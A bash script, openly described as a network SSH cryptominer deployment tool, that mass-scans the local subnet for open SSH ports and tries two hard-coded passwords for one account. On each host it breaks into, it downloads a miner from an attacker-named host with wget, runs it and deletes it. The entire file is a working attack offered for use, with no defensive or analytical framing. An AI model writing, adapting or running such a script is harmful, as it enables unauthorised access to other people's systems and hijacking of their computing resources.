#!/bin/bash

# Network SSH Cryptominer Deployment Script
# This script scans a network for SSH connections with specific credentials,
# transfers a cryptominer, executes it, and cleans up.

# Configuration
USERNAME="iteradmin"
PASSWORD1="iter123#"
PASSWORD2="ITER123#"
CRYPTOMINER_URL="http://attackers-website.com/cryptominer.sh"
LOG_FILE="ssh_scan_$(date +%Y%m%d_%H%M%S).log"
MAX_JOBS=100  # Maximum parallel jobs

# Function to display usage
usage() {
    echo "Usage: $0 [network_interface]"
    echo "Example: $0 eth0"
    exit 1
}

# Check if network interface is provided
if [ $# -eq 0 ]; then
    usage
fi

INTERFACE=$1

# Check if required tools are installed
command -v masscan >/dev/null 2>&1 || { echo "masscan is required but not installed. Aborting." >&2; exit 1; }
command -v sshpass >/dev/null 2>&1 || { echo "sshpass is required but not installed. Aborting." >&2; exit 1; }

# Get network information
echo "[*] Getting network information for interface: $INTERFACE" | tee -a "$LOG_FILE"
IP_INFO=$(ip addr show "$INTERFACE" | grep 'inet ' | head -n1)
if [ -z "$IP_INFO" ]; then
    echo "[!] Failed to get IP information for interface $INTERFACE" | tee -a "$LOG_FILE"
    exit 1
fi

# Extract IP and netmask
CURRENT_IP=$(echo "$IP_INFO" | awk '{print $2}' | cut -d'/' -f1)
SUBNET_PREFIX=$(echo "$IP_INFO" | awk '{print $2}' | cut -d'/' -f2)
echo "[*] Current IP: $CURRENT_IP" | tee -a "$LOG_FILE"
echo "[*] Subnet prefix: /$SUBNET_PREFIX" | tee -a "$LOG_FILE"

# Calculate network range using ipcalc
NETWORK_INFO=$(ipcalc -c -n -b "$IP_INFO" 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "[!] Failed to calculate network range" | tee -a "$LOG_FILE"
    exit 1
fi

NETWORK=$(echo "$NETWORK_INFO" | grep "Network:" | awk '{print $2}')
echo "[*] Network range: $NETWORK" | tee -a "$LOG_FILE"

# Function to test SSH connection and deploy cryptominer
test_ssh_and_deploy() {
    local target_ip=$1
    local port=22
    
    echo "[*] Testing SSH connection to $target_ip:$port" | tee -a "$LOG_FILE"
    
    # Try to connect with first password
    sshpass -p "$PASSWORD1" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes "$USERNAME@$target_ip" 'echo "Connection successful"' >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] SSH connection successful to $target_ip with password $PASSWORD1" | tee -a "$LOG_FILE"
        deploy_cryptominer "$target_ip" "$PASSWORD1"
        return 0
    fi
    
    # Try to connect with second password
    sshpass -p "$PASSWORD2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes "$USERNAME@$target_ip" 'echo "Connection successful"' >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] SSH connection successful to $target_ip with password $PASSWORD2" | tee -a "$LOG_FILE"
        deploy_cryptominer "$target_ip" "$PASSWORD2"
        return 0
    fi
    
    echo "[-] SSH connection failed to $target_ip" | tee -a "$LOG_FILE"
    return 1
}

# Function to deploy cryptominer
deploy_cryptominer() {
    local target_ip=$1
    local password=$2
    
    echo "[*] Deploying cryptominer to $target_ip" | tee -a "$LOG_FILE"
    
    # Download and execute the cryptominer in one command
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$USERNAME@$target_ip" \
        "wget -q -O /tmp/cryptominer.sh '$CRYPTOMINER_URL' && chmod +x /tmp/cryptominer.sh && /tmp/cryptominer.sh && rm -f /tmp/cryptominer.sh" \
        2>&1 | tee -a "$LOG_FILE"
    
    if [ ${PIPESTATUS[0]} -eq 0 ]; then
        echo "[+] Cryptominer deployed and executed successfully on $target_ip" | tee -a "$LOG_FILE"
    else
        echo "[!] Failed to deploy cryptominer on $target_ip" | tee -a "$LOG_FILE"
    fi
}

# Main scanning loop
echo "[*] Starting network scan with masscan..." | tee -a "$LOG_FILE"
echo "[*] This will be significantly faster than traditional scanning" | tee -a "$LOG_FILE"

# Use masscan to find hosts with port 22 open
echo "[*] Discovering hosts with SSH open..." | tee -a "$LOG_FILE"
MASSCAN_OUTPUT=$(mktemp)
masscan -p22 "$NETWORK" --rate=1000 -oL "$MASSCAN_OUTPUT" 2>/dev/null

# Process the results and test SSH connections in parallel
echo "[*] Processing scan results and testing SSH connections..." | tee -a "$LOG_FILE"
ACTIVE_COUNT=0
SUCCESS_COUNT=0

while read -r line; do
    # Skip empty lines and comments
    if [ -z "$line" ] || [[ "$line" == "#*" ]]; then
        continue
    fi
    
    # Extract IP from masscan output
    TARGET_IP=$(echo "$line" | awk '{print $4}')
    
    # Skip our own IP
    if [ "$TARGET_IP" = "$CURRENT_IP" ]; then
        continue
    fi
    
    ((ACTIVE_COUNT++))
    echo "[*] Found active SSH host: $TARGET_IP" | tee -a "$LOG_FILE"
    
    # Run the SSH test in the background
    (test_ssh_and_deploy "$TARGET_IP" && ((SUCCESS_COUNT++))) &
    
    # Control the number of parallel jobs
    if (( $(jobs -r | wc -l) >= MAX_JOBS )); then
        wait -n
    fi
done < "$MASSCAN_OUTPUT"

# Wait for all remaining jobs to complete
wait

# Clean up
rm -f "$MASSCAN_OUTPUT"

echo "[*] Network scan completed" | tee -a "$LOG_FILE"
echo "[*] Found $ACTIVE_COUNT hosts with SSH open" | tee -a "$LOG_FILE"
echo "[*] Successfully deployed cryptominer on $SUCCESS_COUNT hosts" | tee -a "$LOG_FILE"
echo "[*] Results logged to $LOG_FILE" | tee -a "$LOG_FILE"

exit 0
